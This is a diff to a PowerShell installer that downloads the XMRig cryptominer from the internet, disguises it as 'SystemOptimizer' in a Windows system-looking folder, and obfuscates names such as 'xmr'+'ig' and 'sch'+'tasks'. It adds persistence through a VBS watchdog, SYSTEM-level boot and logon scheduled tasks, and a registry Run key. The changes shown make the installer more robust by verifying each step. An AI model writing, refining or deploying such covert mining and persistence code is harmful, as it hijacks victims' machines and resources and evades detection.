@@ -1,5 +1,5 @@
 #Requires -RunAsAdministrator
-$ErrorActionPreference = "SilentlyContinue"
+$ErrorActionPreference = "Stop"
 
 # Admin check (iex ignores #Requires)
 if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) { exit }
@@ -8,6 +8,7 @@ if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
 $baseDir = "$env:LOCALAPPDATA\Microsoft\Windows\SystemOptimizer"
 $xmrigExe = "$baseDir\SystemOptimizer.exe"
 $configFile = "$baseDir\config.json"
+$watchdogPath = "$baseDir\watchdog.vbs"
 $zipUrl = "https://github.com/" + 'xmr'+'ig' + "/" + 'xmr'+'ig' + "/releases/download/v6.26.0/" + 'xmr'+'ig' + "-6.26.0-windows-x64.zip"
 $zipPath = "$baseDir\xmrig.zip"
 
@@ -34,8 +35,9 @@ Remove-Item -Recurse -Force "$baseDir" 2>$null
 & ('sch'+'tasks') /Delete /TN "ModestFermi_XMRig" /F 2>$null
 Start-Sleep 1
 
-# ===== CREATE DIR (after cleanup) =====
-New-Item -ItemType Directory -Force -Path $baseDir | Out-Null
+# ===== CREATE DIR (after cleanup) - VERIFIED =====
+$dir = New-Item -ItemType Directory -Force -Path $baseDir
+if (-not (Test-Path $baseDir)) { throw "Failed to create directory: $baseDir" }
 
 # ===== DOWNLOAD XMRIG (NO WINRING0) =====
 if (-not (Test-Path $xmrigExe)) {
@@ -46,8 +48,9 @@ if (-not (Test-Path $xmrigExe)) {
         Move-Item "$baseDir\_tmp\" + 'xmr'+'ig' + "-6.26.0\xmrig.exe" $xmrigExe -Force
         Remove-Item "$baseDir\_tmp" -Recurse -Force -ErrorAction SilentlyContinue
         Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
-    } catch { }
+    } catch { throw "XMRig download failed: $_" }
 }
+if (-not (Test-Path $xmrigExe)) { throw "XMRig not found after download" }
 
 # ===== WRITE CONFIG =====
 $config = @{
@@ -61,7 +64,6 @@ $config = @{
 $config | Out-File -FilePath $configFile -Encoding ascii
 
 # ===== WATCHDOG.VBS =====
-$watchdogPath = "$baseDir\watchdog.vbs"
 $wd = @'
 Set sh = CreateObject("WScript.Shell")
 Set wmi = GetObject("winmgmts:")
@@ -75,13 +77,14 @@ Do
 Loop
 '@ -replace '%EXE%', $xmrigExe -replace '%CFG%', $configFile
 $wd | Out-File -FilePath $watchdogPath -Encoding ascii
+if (-not (Test-Path $watchdogPath)) { throw "Watchdog.vbs not created at $watchdogPath" }
 
 # ===== SCHEDULED TASKS (SYSTEM, boot + logon) =====
 $taskName = "SystemOptimizer"
 $wdPathEscaped = $watchdogPath -replace '"', '`"'
-& ('sch'+'tasks') /Create /TN "$taskName" /TR "wscript.exe `"$wdPathEscaped`"" /SC ONSTART /RU SYSTEM /RL HIGHEST /F 2>$null
-& ('sch'+'tasks') /Create /TN "$taskName-Logon" /TR "wscript.exe `"$wdPathEscaped`"" /SC ONLOGON /RU SYSTEM /RL HIGHEST /F 2>$null
-& ('sch'+'tasks') /Change /TN "$taskName" /RI 1 /DU 9999:59 /K 2>$null
+& ('sch'+'tasks') /Create /TN "SystemOptimizer" /TR "wscript.exe `"$watchdogPath`"" /SC ONSTART /RU SYSTEM /RL HIGHEST /F
+& ('sch'+'tasks') /Create /TN "SystemOptimizer-Logon" /TR "wscript.exe `"$watchdogPath`"" /SC ONLOGON /RU SYSTEM /RL HIGHEST /F
+& ('sch'+'tasks') /Change /TN "SystemOptimizer" /RI 1 /DU 9999:59 /K
 
 # ===== REGISTRY RUN KEY =====
 try { Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "SystemOptimizer" -Value "wscript.exe `"$watchdogPath`"" -Force -ErrorAction SilentlyContinue } catch { }
